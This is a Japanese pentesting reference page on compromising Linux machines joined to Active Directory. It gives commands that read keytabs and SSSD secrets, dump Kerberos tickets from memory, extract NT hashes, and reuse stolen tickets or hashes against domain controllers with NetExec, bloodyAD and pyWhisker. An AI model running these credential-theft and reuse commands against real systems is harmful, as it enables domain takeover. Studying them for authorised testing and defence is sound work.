# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux マシンが Active Directory 環境内に存在することもあります。

AD 内の Linux マシンには、Kerberos のマテリアル（ユーザーの ccache、マシン／サービスの keytab、SSSD が管理するシークレット）がローカルに保存されていることがあります。通常、これらのアーティファクトは他の Kerberos 認証情報と同様に再利用できます。その大半を読み取るには、チケットの所有ユーザーまたはマシン上の **root** である必要があります。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## 列挙

### Linux からの AD の列挙

Linux（または Windows 上の bash）から AD にアクセスできる場合は、[https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) を使って AD を列挙できます。

**Linux から AD を列挙するその他の方法**については、次のページも確認してください。


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA は、主に **Unix** 環境向けの、Microsoft Windows **Active Directory** のオープンソースの**代替**です。完全な **LDAP ディレクトリ**と MIT **Kerberos** Key Distribution Center を組み合わせ、Active Directory と同様の管理機能を提供します。CA および RA 証明書の管理に Dogtag **Certificate System** を利用し、スマートカードを含む**多要素**認証に対応しています。SSSD は Unix の認証プロセスに統合されています。<sup>[[14]](#references)[[15]](#references)</sup> 詳しくは次をご覧ください:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### ドメイン参加ホストのアーティファクト

チケットを扱う前に、**ホストがどのように AD に参加したか**、また **Kerberos のマテリアルが実際にどこに保存されているか**を特定してください。現在の Linux ホストでは、`realmd` + `adcli` + `sssd` によって処理されることが一般的であり、`/tmp` 内の単純なファイルだけで管理されているわけではありません。<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

これは、ホストが AD を信頼しているか、SSSD が ID やチケットをキャッシュしているか、また abuse に利用できる **machine/service keytabs** や **KCM secrets** があるかをすぐに確認できます。<sup>[[4]](#references)[[10]](#references)</sup>

`/var/lib/sss/db/cache_*.ldb` は、Kerberos ccache や `/var/lib/sss/secrets/secrets.ldb` とは分けて扱ってください。`cache_*.ldb` ファイルには、ドメインで `cache_credentials = true` が設定され、**かつ**ユーザーが以前そのホストで認証していた場合、オフライン用のパスワード検証情報が保存されていることがあります。通常、これらのファイルを読み取るには特権アクセスが必要です。キャッシュファイルや設定が有効であることだけでは、利用可能で現在も有効なパスワードがあるとは証明できません。結論を出す前に、ドメインごとの実効設定と実際にキャッシュされている ID を確認してください。[Red Hat の SSSD credential-cache ドキュメント](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication)を参照してください。Linux と AD の ID 境界については、[ベンダー混在環境での Kerberos name mapping](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/)が関係するのは、サービスがチケットを受け入れ、その principal を該当する Unix アカウントにマッピングする場合に限られます。

`ksu` があるホストでは、Kerberos principal が有効でも、対象アカウントがその principal を許可している場合に限り、root を含む**ローカルの対象アカウント**にアクセスできます。[MIT Kerberos のドキュメント](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html)では、対象ユーザーのホームディレクトリにある `.k5login` と `.k5users` ファイル、およびどちらも存在しない場合の name-mapping fallback について説明しています。`.k5users` は `ksu -e` で実行できるコマンドを制限する場合もあります。ファイルが存在するだけでは、シェルアクセスが可能とは証明できません。対象アカウント、ファイルの所有者と権限、読み取り可能な認可エントリ、利用可能な Kerberos credential、および実効マッピングルールを正確に確認してください。root のホームディレクトリにアクセスできない場合、認可状態は不明のままです。受動的な列挙では、チケットを要求したり `ksu` を実行したりせず、これらのパスと権限を一覧表示してください。

スケジュールされたバックアップが、間接的に `.k5login` による認可境界を作ることがあります。より高い権限を持つアカウントが、低権限ユーザーが書き込み可能なディレクトリを自身のホームディレクトリに再帰的にコピーする場合、コピーに隠しファイルが含まれること、そのコピー先がそのアカウントの実効ホームディレクトリであること、生成されたファイルの所有者が Kerberos login service に受け入れられることを確認してください。たとえば、[rsync のドキュメント](https://download.samba.org/pub/rsync/rsync.1.html)によると、`-a --no-owner` は新しいコピー先ファイルの所有者を受信側ユーザーのままにします。[MIT Kerberos のドキュメント](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html)では、そのユーザーの `.k5login` にある principal がアクセスを許可する仕組みについて説明しています。スケジュールされたジョブの RunAs ID、ソースへの書き込み権限、実効 rsync オプション、GSSAPI が有効なログイン、および記載された principal に対する有効なチケットを確認してください。ソースディレクトリが書き込み可能であることや、スケジュールされた rsync コマンドがあることだけでは、この経路は証明できません。

読み取り可能な keytab についても、principal ごとに確認する必要があります。管理者を示す名前の principal が keytab に含まれていても、それだけでは管理者権限の証明になりません。[KDC の `kadm5.acl` ポリシー](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html)が、principal に許可される操作を制御します。keytab へのアクセスを root への経路と判断する前に、principal、実効 ACL、ローカルの `ksu` またはログイン認可をそれぞれ確認してください。受動的なトリアージでは、鍵を使用したり KDC に接続したりせず、keytab のパスと権限を一覧表示できます。

## チケットを調べる

### Pass The Ticket

このページでは、**Linux ホスト内で Kerberos チケットを見つけられる場所**を紹介します。次のページでは、これらの CCache チケット形式を Kirbi（Windows で使用する形式）に変換する方法と、PTT attack の実行方法を学べます。


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux 固有のチケット収集ワークフロー**（`FILE`、`DIR`、`KEYRING`、`KCM`、`/proc` など）については、専用ページを確認してください。

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### /tmp からの CCACHE チケット再利用

CCACHE ファイルは、**Kerberos credential を保存する**ためのバイナリ形式です。`FILE:/tmp/krb5cc_%{uid}` は今も一般的ですが、最近の Linux 環境では `DIR:/run/user/%{uid}/krb5cc*`、`KEYRING:persistent:%{uid}`、`KCM:%{uid}` も使用されます。チケットが `/tmp` にあると決めつける前に、**`KRB5CCNAME`** 環境変数と `default_ccache_name` の設定を確認してください。<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### keyring からの CCACHE ticket 再利用

**プロセスのメモリに保存された Kerberos ticket は抽出できます**。特に、マシンの ptrace 保護（`/proc/sys/kernel/yama/ptrace_scope`）が無効になっている場合に可能です。この目的に役立つツールは [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) にあり、セッションにインジェクションして `/tmp` に ticket をダンプすることで、抽出を容易にします。<sup>[[1]](#references)[[16]](#references)</sup>

このツールを設定して使用するには、以下の手順に従います。

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

この手順では、さまざまなセッションへの注入を試み、抽出したticketを`__krb_UID.ccache`という命名規則で`/tmp`に保存することで成功を示します。<sup>[[1]](#references)</sup>

### SSSD KCMからのCCACHE ticket再利用

SSSDは、データベースのコピーを`/var/lib/sss/secrets/secrets.ldb`に保持します。対応するキーは、`/var/lib/sss/secrets/.secrets.mkey`に隠しファイルとして保存されます。デフォルトでは、**root**権限がある場合にのみキーを読み取れます。<sup>[[4]](#references)</sup>

**`SSSDKCMExtractor`**を--databaseおよび--keyパラメータとともに実行すると、データベースが解析され、**secretsが復号化されます**。<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

Extractor は raw Kerberos JSON payload を出力するため、pass-the-cache/pass-the-ticket 操作の前に、利用可能な ticket cache または別の ticket format に変換してください。<sup>[[4]](#references)</sup>

### keytab の簡易トリアージ

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### /etc/krb5.keytab からアカウントを抽出する

root 権限で動作するサービスに不可欠なサービスアカウントのキーは、**`/etc/krb5.keytab`** ファイルに安全に保存されています。サービスのパスワードに相当するこれらのキーは、厳重に機密を保持する必要があります。<sup>[[5]](#references)</sup>

keytab ファイルの内容を確認するには、**`klist`** を使用できます。Linux では、`klist -k -K -e` を実行すると、プリンシパル、キーのバージョン番号、暗号化タイプ、およびキーの生データが表示されます。キータイプが **23 / RC4-HMAC** の場合、キー値はそのプリンシパルの **NT hash** でもあります。<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Linuxユーザー向けの**`KeyTabExtract`**は、NTLM hashの再利用に活用できるRC4 HMAC hashを抽出する機能を提供します。ただし、これはkeytabに**etype 23 / RC4-HMAC**の情報が残っている場合に限り有効です。**AESのみ**の環境では再利用可能なNT hashを取得できない場合がありますが、Kerberos経由でkeytabを使って直接認証することは可能です。<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

macOSでは、**`bifrost`**はkeytabファイルの分析ツールとして機能します。<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

抽出したアカウント情報とハッシュ情報を利用すると、**`NetExec`** などのツールを使ってサーバーに接続できます。<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### `/etc/krb5.keytab` のマシンアカウントを再利用する

`realmd`/`adcli`/`sssd` で参加したシステムでは、`/etc/krb5.keytab` に通常、**コンピューターアカウント**と1つ以上の**ホスト/サービスプリンシパル**が含まれています。**root** を持っている場合は、単に内容をダンプするのではなく、`klist -k` に表示されるプリンシパルのいずれかを使って TGT を要求し、Linux ホスト自体として操作してください。<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

これは、**コンピューター オブジェクト**自体が AD で委任された権限を持つ場合や、ホストが **gMSA** などの他のシークレットを取得できる場合に特に役立ちます。<sup>[[13]](#references)</sup>

### Linux-first AD tooling で盗んだ Kerberos material を再利用する

有効な `ccache` または使用可能な keytab があれば、すべてを先に Windows 形式に変換しなくても、**Linux から直接** AD に対して操作できます。最新のツールの多くは、`KRB5CCNAME` / Kerberos 認証をネイティブにサポートしています。<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

これは、**Linux post-exploitation** と **AD object abuse** をつなぐ良い内容です。オブジェクトレベルの abuse path については、以下を確認してください。

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account の痕跡

最近の Linux 環境では、AD から **Managed Service Accounts** を直接利用できます。実際には、Linux サーバーを侵害した後、ホストの keytab だけでなく、gMSA から生成された**サービス固有の keytab** が見つかる可能性があります。確認すべき一般的な場所は、`/etc/gmsad.conf`、デプロイ固有の設定ファイル、および `/etc` 配下の追加の `*.keytab` ファイルです。<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

これにより、**Windows endpoint に一切触れることなく**、その gMSA に紐づく SPN 用の再利用可能な Kerberos identity を取得できます。<sup>[[13]](#references)</sup> AD でより高い権限を得た後の**ドメイン側**での gMSA/dMSA abuse については、こちらを確認してください。

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos（II）：Kerberosを攻撃する方法](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [managed service account を使用した AD へのアクセス – RHEL システムを Active Directory と直接統合する](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Kerberos 環境変数 – MIT Kerberos ドキュメント](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos ドキュメント](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757：Microsoft Windows で使用される RC4-HMAC Kerberos 暗号化タイプ](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Kerberos の使用 | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Identity Domain の検出と参加 | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD ユーザーガイド](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [概要 | FreeIPA ドキュメント](https://www.freeipa.org/About.html)
- [15] [FreeIPA 4.11.0 リリースノート](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Linux Kernel ドキュメント](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos ドキュメント](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
